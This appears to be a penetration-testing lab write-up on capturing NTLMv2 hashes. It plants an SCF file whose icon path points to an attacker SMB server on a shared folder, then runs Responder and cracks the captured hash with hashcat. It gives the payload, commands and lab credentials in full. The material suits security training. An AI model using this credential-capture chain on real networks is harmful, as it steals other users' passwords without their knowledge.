# Section 25 — Interacting with Users

> **Lab: yes** — RDP to target, place SCF file on writable share, capture NTLMv2 hash with Responder, crack with hashcat.

**Core principle:** When you can't escalate through misconfigurations or exploits, target other users on the system. Place malicious files (SCF, URL, LNK) on file shares that other users browse. When they open the folder, Windows automatically authenticates to your attacker-controlled SMB server, leaking NTLMv2 hashes you can crack offline.

---

## SCF (Shell Command File) attack

### How it works

SCF files contain an `IconFile` directive that points to a UNC path. When a user opens a folder containing the SCF file, Windows Explorer automatically tries to load the icon — sending the user's NTLMv2 hash to the attacker's SMB server. No user interaction beyond opening the folder is required.

### Create the SCF file

```ini
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```
> Save as `@something.scf` — the `@` prefix sorts it to the top of the directory listing so it's processed first when anyone browses the folder.

### Place it on a writable share

First, find writable shares:

```cmd
net share
```
> Lists all shares on the local machine.

Check permissions on share subdirectories:

```cmd
icacls "C:\Department Shares\Public\IT"
```
> Look for `BUILTIN\Users:(OI)(CI)(F)` or similar full-control/write entries. The SCF file must go in a directory that other users actually browse — not your own Desktop.

### Start Responder

On Kali:

```bash
sudo responder -wv -I tun0
```
> `-w` enables WPAD rogue proxy, `-v` verbose output. Responder listens on SMB (port 445) and captures NTLMv2 hashes from any machine that connects.

### Crack the hash

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```
> Mode 5600 = NTLMv2. Save the captured hash to a file first. The hash format from Responder looks like: `USER::DOMAIN:challenge:response:blob`.

---

## Other file types that trigger SMB auth

| File Type | Trigger | Notes |
|-----------|---------|-------|
| **SCF** (.scf) | Folder opened | IconFile UNC path, no click needed |
| **URL** (.url) | Folder opened | IconFile or URL= pointing to UNC |
| **LNK** (.lnk) | Folder opened | Icon location set to UNC path |
| **Desktop.ini** | Folder opened | IconResource= UNC path |
| **Office docs** | File opened | Embedded UNC links, macros |

---

## Key placement strategy

- **Don't place on your own Desktop** — you'll only capture your own hash.
- **Find shares other users/services browse** — `C:\Department Shares\Public\` or similar shared directories.
- **Use `@` prefix** — `@inventory.scf` sorts to top, gets processed before other files.
- **Service accounts are high-value targets** — accounts like `sccm_svc` often have elevated privileges and predictable browsing patterns.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (YOURHOST)
**RDP Creds:** `htb-student` / `HTB_@cademy_stdnt!`

### Attack chain

```
STEP 1: CONNECT AND ENUMERATE SHARES
─────────────────────────────────────
1. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:htb-student /p:'HTB_@cademy_stdnt!'

2. List shares and check permissions
   net share
   icacls "C:\Department Shares\Public\IT"
   → Look for BUILTIN\Users:(OI)(CI)(F) — full control for all users

STEP 2: CREATE AND PLACE SCF FILE
──────────────────────────────────
3. Create @inventory.scf in the writable share
   Open Notepad, paste:
     [Shell]
     Command=2
     IconFile=\\YOUR_KALI_TUN0_IP\share\icon.ico
     [Taskbar]
     Command=ToggleDesktop
   
   Save as: C:\Department Shares\Public\IT\@inventory.scf
   → Must be in a directory other users browse, NOT your Desktop
   → The @ prefix ensures it's processed first when folder is opened

STEP 3: CAPTURE HASH WITH RESPONDER
────────────────────────────────────
4. On Kali, start Responder
   sudo responder -wv -I tun0
   → Wait for a service account or user to browse the share
   → Hash appears as NTLMv2 in Responder output

STEP 4: CRACK THE HASH
───────────────────────
5. Save the NTLMv2 hash to a file
   Copy the full hash line from Responder output into hash.txt

6. Crack with hashcat
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
   → Mode 5600 = NTLMv2
   → Result: sccm_svc / Password1
```

---

## Key takeaways

- **SCF files trigger SMB auth when a folder is opened.** No user click required — just browsing the folder in Explorer loads the icon.
- **Placement matters more than the file itself.** Put the SCF on a share that other users/services actively browse, not your own Desktop.
- **Responder captures NTLMv2 hashes passively.** Use `sudo responder -wv -I tun0` — the `-r` flag is not always supported.
- **Service accounts are prime targets.** They often have weak passwords and elevated privileges (sccm_svc cracked to Password1).
- **hashcat -m 5600 cracks NTLMv2.** The full hash from Responder goes directly into hashcat.
